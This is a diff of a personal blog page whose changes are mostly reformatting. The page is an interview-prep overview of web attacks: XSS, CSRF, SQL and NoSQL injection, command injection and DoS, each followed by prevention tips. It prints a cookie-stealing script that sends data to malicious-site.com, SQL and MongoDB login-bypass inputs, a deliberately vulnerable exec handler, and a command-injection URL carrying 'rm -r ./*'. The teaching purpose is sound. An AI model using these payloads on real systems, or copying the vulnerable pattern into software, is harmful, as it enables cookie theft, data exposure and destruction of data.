@@ -1,226 +1,35 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-	<meta charset="UTF-8" />
-	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-	<title>Bert's Blog</title>
-	<meta name="keywords" content="blog,javascript,typescript,code,frontend">
-	<meta name="description" content="bert huang's blog">
-	<link rel="icon" href="/assets/favicon.ico"/>
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/4.0.0/github-markdown.min.css" integrity="sha512-Oy18vBnbSJkXTndr2n6lDMO5NN31UljR8e/ICzVPrGpSud4Gkckb8yUpqhKuUNoE+o9gAb4O/rAxxw1ojyUVzg==" crossorigin="anonymous" />
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/a11y-light.min.css" integrity="sha512-PW96n2amVglidqEDLPUdjJ0zByhT20poSqWJYZRutR6CP2QH58k96WmorqNnC4QXnosNeqMJM8FR/93isIifDQ==" crossorigin="anonymous" />	
-	<link rel="stylesheet" href="/blog/style.css" />
-	<style>
-		.markdown-body {
-			box-sizing: border-box;
-			min-width: 200px;
-			max-width: 980px;
-			margin: 0 auto;
-			padding: 45px;
-		}
-	
-		@media (max-width: 767px) {
-			.markdown-body {
-				padding: 15px;
-			}
-		}
-	</style>
-</head>
-
-<body>
-	<div>
-		<div class="container"><div class="side-bar"><img class="avatar" src="/assets/avatar.jpeg"/><h1>Bert Huang</h1><p>一位兴趣广泛的前端程序员</p><nav><ul><li><a href="/blog/index.html">Index</a></li><li><a href="/blog/code.html">Code</a></li><li><a href="/blog/leetcode.html">LeetCode</a></li><li><a href="/blog/essay.html">Essay</a></li><li><a href="/blog/about.html">About</a></li></ul></nav><div id="social"><a href="https://github.com/Bert0324"><img class="social-avatar" src="https://github.githubassets.com/favicons/favicon.png"/></a><a href="https://www.facebook.com/people/Yuchen-Huang/100005315205237"><img class="social-avatar" src="/assets/facebook.png"/></a><a href="https://twitter.com/BertHuang5"><img class="social-avatar" src="/assets/twitter.png"/></a></div><div class="views-count"><p id="busuanzi_container_site_pv" style="display:inline">total views: <span id="busuanzi_value_site_pv"></span></p></div></div><div class="post-content"><div class="post-container"><div class="post-article"><article class="markdown-body">
-		<div>
-			<div id="toc"><div class="last-edit"><p>Last Commit: 2021-02-17 00:18:48</p><p id="busuanzi_container_page_pv">views: <span id="busuanzi_value_page_pv"></span></p></div><div id="toc-body"><p><strong>Table of Content</strong></p><ul><li><a href="#xss">xss</a></li><li><a href="#persistent xss">persistent xss</a></li><li><a href="#reflected xss">reflected xss</a></li><li><a href="#dom-based xss">dom-based xss</a></li><li><a href="#how to prevent xss">how to prevent xss</a></li><li><a href="#csrf">csrf</a></li><li><a href="#check http referer">check http referer</a></li><li><a href="#token">token</a></li><li><a href="#injection attack">injection attack</a></li><li><a href="#sql injection">sql injection</a></li><li><a href="#number injection">number injection</a></li><li><a href="#string injection">string injection</a></li><li><a href="#nosql injection">nosql injection</a></li><li><a href="#command injection">command injection</a></li><li><a href="#how to prevent">how to prevent</a></li><li><a href="#dos attack">dos attack</a></li></ul></div></div>
-			<div><p>When I was in an interview of Tencent, the interviewer asked me how much Web security points you know?</p>
-<p>I found I don&#39;t have a systemic knowledge network about it.</p>
-<p>So, there are some points I collected for memory.</p>
-
-			<h2 id='xss'>
-				XSS
-			</h2>
-		<p>Its full name is Cross Site Script. But its abbreviation is CSS, which is the same as Cascading 
-Style Sheets. SO....it becomes XSS. </p>
-<p>XSS is a code injection attack that allows an attacker to execute malicious 
-JavaScript in another user&#39;s browser.</p>
-<p>It includes these 3 types:</p>
-
-			<h3 id='persistent xss'>
-				Persistent XSS
-			</h3>
-		<p>Normally happened in those websites users can post their input. The malicious code will be saved in 
-the database, therefore, each user who opened the page will be attacked.</p>
-<p>For example, if there is a input tag, user can post their own content by it. Other users can open this page see 
-the content.</p>
-<pre><code class="language-html"><span class="hljs-comment">&lt;!--the content in this tag will be post to database--&gt;</span>
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bert's Blog</title><meta name="keywords" content="blog,javascript,typescript,code,frontend"><meta name="description" content="bert huang's blog"><link rel="icon" href="/assets/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/4.0.0/github-markdown.min.css" integrity="sha512-Oy18vBnbSJkXTndr2n6lDMO5NN31UljR8e/ICzVPrGpSud4Gkckb8yUpqhKuUNoE+o9gAb4O/rAxxw1ojyUVzg==" crossorigin="anonymous"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/a11y-light.min.css" integrity="sha512-PW96n2amVglidqEDLPUdjJ0zByhT20poSqWJYZRutR6CP2QH58k96WmorqNnC4QXnosNeqMJM8FR/93isIifDQ==" crossorigin="anonymous"><link rel="stylesheet" href="/blog/style.css"><style>.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto;padding:45px}@media (max-width:767px){.markdown-body{padding:15px}}</style></head><body><div><div class="container"><div class="side-bar"><img class="avatar" src="/assets/avatar.jpeg"><h1>Bert Huang</h1><p>一位兴趣广泛的前端程序员</p><nav><ul><li><a href="/blog/index.html">Index</a></li><li><a href="/blog/code.html">Code</a></li><li><a href="/blog/leetcode.html">LeetCode</a></li><li><a href="/blog/essay.html">Essay</a></li><li><a href="/blog/about.html">About</a></li></ul></nav><div id="social"><a href="https://github.com/Bert0324"><img class="social-avatar" src="https://github.githubassets.com/favicons/favicon.png"></a><a href="https://www.facebook.com/people/Yuchen-Huang/100005315205237"><img class="social-avatar" src="/assets/facebook.png"></a><a href="https://twitter.com/BertHuang5"><img class="social-avatar" src="/assets/twitter.png"></a></div><div class="views-count"><p id="busuanzi_container_site_pv" style="display:inline">total views: <span id="busuanzi_value_site_pv"></span></p></div></div><div class="post-content"><div class="post-container"><div class="post-article"><article class="markdown-body"><div><div id="toc"><div class="last-edit"><p>Last Commit: 2021-02-17 12:52:31</p><p id="busuanzi_container_page_pv">views: <span id="busuanzi_value_page_pv"></span></p></div><div id="toc-body"><p><strong>Table of Content</strong></p><ul><li><a href="#xss">xss</a></li><li><a href="#persistent%20xss">persistent xss</a></li><li><a href="#reflected%20xss">reflected xss</a></li><li><a href="#dom-based%20xss">dom-based xss</a></li><li><a href="#how%20to%20prevent%20xss">how to prevent xss</a></li><li><a href="#csrf">csrf</a></li><li><a href="#check%20http%20referer">check http referer</a></li><li><a href="#token">token</a></li><li><a href="#injection%20attack">injection attack</a></li><li><a href="#sql%20injection">sql injection</a></li><li><a href="#number%20injection">number injection</a></li><li><a href="#string%20injection">string injection</a></li><li><a href="#nosql%20injection">nosql injection</a></li><li><a href="#command%20injection">command injection</a></li><li><a href="#how%20to%20prevent">how to prevent</a></li><li><a href="#dos%20attack">dos attack</a></li></ul></div></div><div><p>When I was in an interview of Tencent, the interviewer asked me how much Web security points you know?</p><p>I found I don&#39;t have a systemic knowledge network about it.</p><p>So, there are some points I collected for memory.</p><h2 id="xss">XSS</h2><p>Its full name is Cross Site Script. But its abbreviation is CSS, which is the same as Cascading Style Sheets. SO....it becomes XSS.</p><p>XSS is a code injection attack that allows an attacker to execute malicious JavaScript in another user&#39;s browser.</p><p>It includes these 3 types:</p><h3 id="persistent%20xss">Persistent XSS</h3><p>Normally happened in those websites users can post their input. The malicious code will be saved in the database, therefore, each user who opened the page will be attacked.</p><p>For example, if there is a input tag, user can post their own content by it. Other users can open this page see the content.</p><pre><code class="language-html"><span class="hljs-comment">&lt;!--the content in this tag will be post to database--&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span> 
 
 <span class="hljs-comment">&lt;!--if a user input &quot;Users content&quot;, other user can see as below--&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Users content<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
-</code></pre>
-<p>But, if someone input a string as below:</p>
-<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-</code></pre>
-<p>the final result may as:</p>
-<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
-</code></pre>
-<p>And the script like as below:</p>
-<pre><code class="language-js"><span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;img&#x27;</span>);
+</code></pre><p>But, if someone input a string as below:</p><pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre><p>the final result may as:</p><pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+</code></pre><p>And the script like as below:</p><pre><code class="language-js"><span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;img&#x27;</span>);
 img.src = <span class="hljs-string">&#x27;http://www.malicious-site.com/save-cookie?cookie=&#x27;</span> + <span class="hljs-built_in">document</span>.cookie;
 <span class="hljs-built_in">document</span>.body.appendChild(img);
-</code></pre>
-<p>In this way, the malicious site can get the cookie of each user who open the page.</p>
-<p>To prevent it, I think the best way is to filter users&#39; post content.</p>
-
-			<h3 id='reflected xss'>
-				Reflected XSS
-			</h3>
-		<p>Its principle is the same as Persistent XSS, attacker try to get user&#39;s personal information 
-by insert HTML tag.</p>
-<p>For example, there is a error page who shows error messages from the server by url, like </p>
-<p><code>http://www.some-page.com/error?message=Page%20not%20found</code></p>
-<p>the content in <code>message</code> will be showed in HTML, like:</p>
-<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Page not found<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
-</code></pre>
-<p>If an attack inputs an URL like </p>
-<p><code>http://www.some-page.com/error?message=&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;</code></p>
-<p>The final HTML will become:</p>
-<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
-</code></pre>
-<p>Next processes will be the same as Persistent XSS.</p>
-
-			<h3 id='dom-based xss'>
-				DOM-based XSS
-			</h3>
-		<p>According to some of articles on the Internet, Dom-based XSS is a special Reflected XSS.</p>
-<p>In my understanding, DOM-based XSS triggers attack via modifying DOM content, such as 
-<code>innerHTML</code>, which is the same as Reflected XSS. </p>
-<p>But, their difference is that Dom-based XSS won&#39;t leave a mark in the server side, compared to Reflected XSS
-which will leave a url record in the server request log.</p>
-<p>There is a simple example updated from last example of Reflected XSS:</p>
-<p>we can use a new url like:</p>
-<p><code>http://www.some-page.com/error?message=Page%20not%20found#%3Cscript%20src%3D%22http%3A%2F%2Fwww.malicious-site.com%2Fcode%22%3E%3C%2Fscript%3E</code></p>
-<p>The biggest difference is that we can use <code>location.hash</code> to inject malicious code to the page, which won&#39;t show the url after <code>#</code> in the 
-server side. In this way, it is more difficult for website maintainers to find the attack by checking request log.</p>
-<p>So the biggest difference among Reflected XSS and DOM-based XSS is that DOM-based XSS cannot be found in the server side, it is 
-pure attack happened on client side.</p>
-
-			<h3 id='how to prevent xss'>
-				How to prevent XSS
-			</h3>
-		<p>I think the best way to prevent XSS is to forbid users to change HTML content, but this is difficult especially for those websites 
-based on UGC. </p>
-<p>So, the feasible way is to filter url&#39;s parameters and UGC, such as some of special chars, <code>&lt;&gt;\/*;&#39;</code>.</p>
-<p>There are some alternative chars to replace sensitive chars in JS, such as <code>\u003c</code> and <code>\x3c</code> to replace <code>&lt;</code>, and <code>\u003e</code> and <code>\x3e</code> to 
-replace <code>&gt;</code>.</p>
-
-			<h2 id='csrf'>
-				CSRF
-			</h2>
-		<p>Its full name is Cross Site Request Forgery, abbreviation is CSRF. </p>
-<p>Like XSS, it may steal users&#39; cookie.</p>
-<p>But their difference is that XSS is to make use of the trust for users, CSRF is to pretend as the user.</p>
-<p>For example, there is a request </p>
-<p><code>http://www.money.com?account=sender&amp;amount=10000&amp;for=receiver</code> </p>
-<p>to transfer money while the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like </p>
-<pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;http://www.money.com?account=sender&amp;amount=10000&amp;for=hacker&#x27;</span>&gt;</span>
-</code></pre>
-<p>the cookie will be with this request because of same domain.</p>
-<p>In this way, the hacker does not need to get the user&#39;s cookie when attacking.</p>
-<p>There are some ways to protect:</p>
-
-			<h3 id='check http referer'>
-				Check HTTP Referer
-			</h3>
-		<p>The most simple way is to check HTTP Referer, which can identify the original website of 
-the request. </p>
-<p>In Node.JS, for example:</p>
-<pre><code class="language-js">app.use(<span class="hljs-function"><span class="hljs-params">req</span> =&gt;</span> {
+</code></pre><p>In this way, the malicious site can get the cookie of each user who open the page.</p><p>To prevent it, I think the best way is to filter users&#39; post content.</p><h3 id="reflected%20xss">Reflected XSS</h3><p>Its principle is the same as Persistent XSS, attacker try to get user&#39;s personal information by insert HTML tag.</p><p>For example, there is a error page who shows error messages from the server by url, like</p><p><code>http://www.some-page.com/error?message=Page%20not%20found</code></p><p>the content in <code>message</code> will be showed in HTML, like:</p><pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Page not found<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+</code></pre><p>If an attack inputs an URL like</p><p><code>http://www.some-page.com/error?message=&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;</code></p><p>The final HTML will become:</p><pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+</code></pre><p>Next processes will be the same as Persistent XSS.</p><h3 id="dom-based%20xss">DOM-based XSS</h3><p>According to some of articles on the Internet, Dom-based XSS is a special Reflected XSS.</p><p>In my understanding, DOM-based XSS triggers attack via modifying DOM content, such as <code>innerHTML</code>, which is the same as Reflected XSS.</p><p>But, their difference is that Dom-based XSS won&#39;t leave a mark in the server side, compared to Reflected XSS which will leave a url record in the server request log.</p><p>There is a simple example updated from last example of Reflected XSS:</p><p>we can use a new url like:</p><p><code>http://www.some-page.com/error?message=Page%20not%20found#%3Cscript%20src%3D%22http%3A%2F%2Fwww.malicious-site.com%2Fcode%22%3E%3C%2Fscript%3E</code></p><p>The biggest difference is that we can use <code>location.hash</code> to inject malicious code to the page, which won&#39;t show the url after <code>#</code> in the server side. In this way, it is more difficult for website maintainers to find the attack by checking request log.</p><p>So the biggest difference among Reflected XSS and DOM-based XSS is that DOM-based XSS cannot be found in the server side, it is pure attack happened on client side.</p><h3 id="how%20to%20prevent%20xss">How to prevent XSS</h3><p>I think the best way to prevent XSS is to forbid users to change HTML content, but this is difficult especially for those websites based on UGC.</p><p>So, the feasible way is to filter url&#39;s parameters and UGC, such as some of special chars, <code>&lt;&gt;\/*;&#39;</code>.</p><p>There are some alternative chars to replace sensitive chars in JS, such as <code>\u003c</code> and <code>\x3c</code> to replace <code>&lt;</code>, and <code>\u003e</code> and <code>\x3e</code> to replace <code>&gt;</code>.</p><h2 id="csrf">CSRF</h2><p>Its full name is Cross Site Request Forgery, abbreviation is CSRF.</p><p>Like XSS, it may steal users&#39; cookie.</p><p>But their difference is that XSS is to make use of the trust for users, CSRF is to pretend as the user.</p><p>For example, there is a request</p><p><code>http://www.money.com?account=sender&amp;amount=10000&amp;for=receiver</code></p><p>to transfer money while the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like</p><pre><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;http://www.money.com?account=sender&amp;amount=10000&amp;for=hacker&#x27;</span>&gt;</span>
+</code></pre><p>the cookie will be with this request because of same domain.</p><p>In this way, the hacker does not need to get the user&#39;s cookie when attacking.</p><p>There are some ways to protect:</p><h3 id="check%20http%20referer">Check HTTP Referer</h3><p>The most simple way is to check HTTP Referer, which can identify the original website of the request.</p><p>In Node.JS, for example:</p><pre><code class="language-js">app.use(<span class="hljs-function"><span class="hljs-params">req</span> =&gt;</span> {
     <span class="hljs-keyword">if</span> (req.headers.referer === <span class="hljs-string">&#x27;http://legal-site.com&#x27;</span>){
         <span class="hljs-comment">//do something</span>
     } <span class="hljs-keyword">else</span> {
         <span class="hljs-comment">//reject request</span>
     }
 });
-</code></pre>
-<p>But, in some of old version chrome, such as IE6 or FF2, there are ways to artificially modify 
-HTTP Referer. Besides, users may forbid browser to offer HTTP Referer.</p>
-
-			<h3 id='token'>
-				Token
-			</h3>
-		<p>CSRF is to forge normal real user request. So, if we can use create a token that the attacker cannot 
-get, we can avoid CSRF.</p>
-<p>For example, we can calculate post message&#39;s hash value in front side, and set it in the url or http header,
-when server is processing the request, it can check the token, if the token is not right, refuse to response.</p>
-
-			<h2 id='injection attack'>
-				Injection Attack
-			</h2>
-		<p>Injection attacks refer to a broad class of attack vectors. In an injection attack, an attacker supplies untrusted 
-input to a program. This input gets processed by an interpreter as part of a command or query. In turn, this alters 
-the execution of that program.</p>
-<p>It includes some of typical types as below:</p>
-
-			<h3 id='sql injection'>
-				SQL Injection
-			</h3>
-		<p>SQL Injection may execute malicious SQL statements in the database, such as getting whole data of the table or specific 
-user information. </p>
-
-			<h4 id='number injection'>
-				Number Injection
-			</h4>
-		<p>For example, if there is a API to GET user&#39;s information: <code>www.example.com?id=1</code>, 
-the SQL statement may be:</p>
-<pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>
-</code></pre>
-<p>When we input <code>www.example.com?id=1 OR 1=1</code>, , the statement will become </p>
-<pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>
-</code></pre>
-<p>As a result, attacker can get whole table information. </p>
-
-			<h4 id='string injection'>
-				String Injection
-			</h4>
-		<p>Or, if there is a API for POST to login, the parameters include username and password. The SQL statement may like </p>
-<pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;password&#x27;</span>
-</code></pre>
-<p>Attacker may try to make the part of statement after username become comments to directly get users&#39; information without password.</p>
-<p>For example, if the user input is <code>user&#39; # </code> and password as <code>password&#39;</code>, the final statement will become:</p>
-<pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> # <span class="hljs-string">&#x27; AND password=&#x27;</span>password<span class="hljs-string">&#x27;&#x27;</span>
-</code></pre>
-<p>Similarly, input user as <code>user&#39; -- </code> also work as:</p>
-<pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-comment">-- &#x27; AND password=&#x27;password&#x27;</span>
-</code></pre>
-<p>These two statements are both the same as:</p>
-<pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span>
-</code></pre>
-
-			<h3 id='nosql injection'>
-				NoSQL Injection
-			</h3>
-		<p>Like SQL, NoSQL database like MongoDB can also be injected.</p>
-<p>Like the same example in SQL Injection, if the application uses NoSQL database such as Mongodb, 
-the statement may be:</p>
-<pre><code>db.users.find({username:user, password=password})
-</code></pre>
-<p>If someone&#39;s JSON input object likes:</p>
-<pre><code>{
+</code></pre><p>But, in some of old version chrome, such as IE6 or FF2, there are ways to artificially modify HTTP Referer. Besides, users may forbid browser to offer HTTP Referer.</p><h3 id="token">Token</h3><p>CSRF is to forge normal real user request. So, if we can use create a token that the attacker cannot get, we can avoid CSRF.</p><p>For example, we can calculate post message&#39;s hash value in front side, and set it in the url or http header, when server is processing the request, it can check the token, if the token is not right, refuse to response.</p><h2 id="injection%20attack">Injection Attack</h2><p>Injection attacks refer to a broad class of attack vectors. In an injection attack, an attacker supplies untrusted input to a program. This input gets processed by an interpreter as part of a command or query. In turn, this alters the execution of that program.</p><p>It includes some of typical types as below:</p><h3 id="sql%20injection">SQL Injection</h3><p>SQL Injection may execute malicious SQL statements in the database, such as getting whole data of the table or specific user information.</p><h4 id="number%20injection">Number Injection</h4><p>For example, if there is a API to GET user&#39;s information: <code>www.example.com?id=1</code>, the SQL statement may be:</p><pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>
+</code></pre><p>When we input <code>www.example.com?id=1 OR 1=1</code>, , the statement will become</p><pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>
+</code></pre><p>As a result, attacker can get whole table information.</p><h4 id="string%20injection">String Injection</h4><p>Or, if there is a API for POST to login, the parameters include username and password. The SQL statement may like</p><pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;password&#x27;</span>
+</code></pre><p>Attacker may try to make the part of statement after username become comments to directly get users&#39; information without password.</p><p>For example, if the user input is <code>user&#39; #</code> and password as <code>password&#39;</code>, the final statement will become:</p><pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> # <span class="hljs-string">&#x27; AND password=&#x27;</span>password<span class="hljs-string">&#x27;&#x27;</span>
+</code></pre><p>Similarly, input user as <code>user&#39; --</code> also work as:</p><pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-comment">-- &#x27; AND password=&#x27;password&#x27;</span>
+</code></pre><p>These two statements are both the same as:</p><pre><code class="language-sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span>
+</code></pre><h3 id="nosql%20injection">NoSQL Injection</h3><p>Like SQL, NoSQL database like MongoDB can also be injected.</p><p>Like the same example in SQL Injection, if the application uses NoSQL database such as Mongodb, the statement may be:</p><pre><code>db.users.find({username:user, password=password})
+</code></pre><p>If someone&#39;s JSON input object likes:</p><pre><code>{
   &quot;username&quot;: &quot;user&quot;,
   &quot;password&quot;: {$gt: &quot;&quot;}
 }
-</code></pre>
-<p>In MongoDB, <code>$gt</code> selects those documents where the value of the field is greater than (i.e. &gt;) the specified value. 
-Thus above statement compares password in database with empty string for greatness, which returns true.</p>
-<p>The same results can be achieved using other comparison operator such as $ne.</p>
-
-			<h3 id='command injection'>
-				Command Injection
-			</h3>
-		<p>Like SQL Injection and NoSQL Injection, Command Injection will also run malicious code because of a user&#39;s input. </p>
-<p>For example, if there is an API allows users to compress specific file in the server:</p>
-<pre><code class="language-js">app.use.get(<span class="hljs-string">&#x27;/gzip&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>{
+</code></pre><p>In MongoDB, <code>$gt</code> selects those documents where the value of the field is greater than (i.e. &gt;) the specified value. Thus above statement compares password in database with empty string for greatness, which returns true.</p><p>The same results can be achieved using other comparison operator such as $ne.</p><h3 id="command%20injection">Command Injection</h3><p>Like SQL Injection and NoSQL Injection, Command Injection will also run malicious code because of a user&#39;s input.</p><p>For example, if there is an API allows users to compress specific file in the server:</p><pre><code class="language-js">app.use.get(<span class="hljs-string">&#x27;/gzip&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>{
     child_process.exec(<span class="hljs-string">`exec <span class="hljs-subst">${req.query.file_path}</span>`</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>)=&gt;</span>{
         <span class="hljs-keyword">if</span> (err){
             res.send(err.toString());
@@ -229,106 +38,4 @@ Thus above statement compares password in database with empty string for greatne
         }
     })
 });
-</code></pre>
-<p>If some one input an URL like: </p>
-<p><code>www.example.com/gzip?file_path=file.txt\rm -r ./*</code></p>
-<p>It may be a disaster.</p>
-
-			<h3 id='how to prevent'>
-				How to prevent
-			</h3>
-		<p>There are some tips:</p>
-<ol>
-<li><p>use prepared statements instead of building dynamic queries using string concatenation.</p>
-</li>
-<li><p>Validate inputs to detect malicious values.</p>
-</li>
-<li><p>To minimize the potential damage of a successful injection attack, do not assign DBA or admin type access rights 
-to your application accounts. Similarly minimize the privileges of the operating system account that the database process runs under.</p>
-</li>
-</ol>
-
-			<h2 id='dos attack'>
-				DoS Attack
-			</h2>
-		<p>In computing, a denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine 
-or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.</p>
-<p>includes:</p>
-<ol>
-<li><p>SYN Flood</p>
-</li>
-<li><p>ICMP Flood</p>
-</li>
-<li><p>UDP Flood</p>
-</li>
-</ol>
-<p>Compared to DoS attack, A distributed denial-of-service (DDoS) attack occurs when multiple systems flood the bandwidth 
-or resources of a targeted system, usually one or more web servers. Such an attack is often the result of multiple 
-compromised systems (for example, a botnet) flooding the targeted system with traffic.</p>
-</div>
-		</div>
-	</article></div></div><div id="reminder" style="display:none">Facebook Comments Service is unavailable</div></div></div>
-	</div>
-</body>
-
-<script>
-	const checkFacebookAvailable = () => new Promise((resolve, reject) => {
-		const i = new Image();
-		i.src = 'https://www.facebook.com/images/facebook.png';
-		i.onerror = e => reject(e);
-		i.onload = () => resolve();
-		i.style.display = 'none';
-		body.append(i);
-		setTimeout(() => reject(), 5000);
-	});
-	const body = document.getElementsByClassName('markdown-body')[0];
-	const initComments = () => {
-		if (![
-			'/',
-			'/blog/index.html', 
-			'/blog/code.html', 
-			'/blog/leetcode.html', 
-			'/blog/essay.html',
-			'/blog/about.html'
-		].includes(window.location.pathname)) {
-			checkFacebookAvailable().then(() => {
-				const root = document.createElement('div');
-				root.id = 'fb-root';
-				root.className = 'post-comments';
-				const comments = document.createElement('div');
-				comments.className = 'fb-comments';
-				comments.setAttribute('data-href', window.location.href);
-				comments.setAttribute('data-numposts', '5');
-				comments.setAttribute('data-width', '100%');
-				root.appendChild(comments);
-				body.appendChild(root);
-			}).catch(() => {
-				const reminder = document.createElement('div');
-				reminder.className = 'reminder';
-				reminder.innerText = 'Facebook Comments Service is unavailable';
-				body.appendChild(reminder);
-			});
-		}
-	};
-	const changeComments = () => {
